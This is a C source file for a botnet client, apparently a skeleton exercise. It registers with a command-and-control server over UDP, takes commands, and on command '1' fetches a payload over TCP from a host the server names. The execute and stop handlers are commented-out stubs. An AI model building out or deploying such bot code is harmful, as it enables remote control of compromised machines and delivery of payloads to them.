#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include "wrapper_functions.h"
#include "msg.h"

#define PAYLOAD_MAX 1024


void usage()
{
	fprintf(stderr, "Usage: ./bot ip port");
	exit(1);
}

void reg(int sockfd, char *ip, int port)
{
	char *packet = "REG\n";
	struct sockaddr_in addr;
	struct addrinfo hints, *res;
	
	printf("Registering on CandC server...\n");
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	
	w_getaddrinfo(ip, NULL, &hints, &res);
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
	
	w_sendto(sockfd, packet, strlen(packet), 0, (const struct sockaddr *)&addr, sizeof(addr));
	
	printf("Bot registered on CandC server.\n");
	
	return;
}

void quit()
{
	printf("Received QUIT from CandC server.\nQuitting...\n");
	exit(0);
}

void prog_tcp(char *ip, int port, char *payload)
{
	printf("Connecting to TCP server...\n");
	
	char *packet = "HELLO\n";
	
	int sockfd = w_socket(AF_INET, SOCK_STREAM, 0);
	
	struct sockaddr_in addr;
	struct addrinfo hints, *res;
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	
	w_getaddrinfo(ip, NULL, &hints, &res);
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
	
	w_connect(sockfd, (const struct sockaddr *)&addr, sizeof addr);
	
	w_send(sockfd, packet, strlen(packet), 0);
	
	w_recv(sockfd, payload, PAYLOAD_MAX, 0);
	
	printf("Received payload.\n");
	
	close(sockfd);
	freeaddrinfo(res);
	
	return;
}

int main(int argc, char **argv)
{
	if(argc != 3) usage();
	
	char *candc_ip = argv[1];
	int candc_port = atoi(argv[2]);
	
	struct msg message;
	char payload[PAYLOAD_MAX];
	
	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
	
	reg(sockfd, candc_ip, candc_port);
	
	while(true){
		
		w_recv(sockfd, &message, sizeof message, 0);
		
		switch(message.command){
			case '0':
				quit();
			case '1':
				prog_tcp(message.entry[0].ip_address,
						atoi(message.entry[0].port_number), payload);
				break;
			case '2':
				//prog_udp();
				break;
			case '3':
				//run();
				break;
			case '4':
				//stop();
				break;
			default:
				fprintf(stderr, "Unknown command from CandC server.\nExiting...\n");
				exit(1);
		}
	}
	
	close(sockfd);
	
	return 0;
}
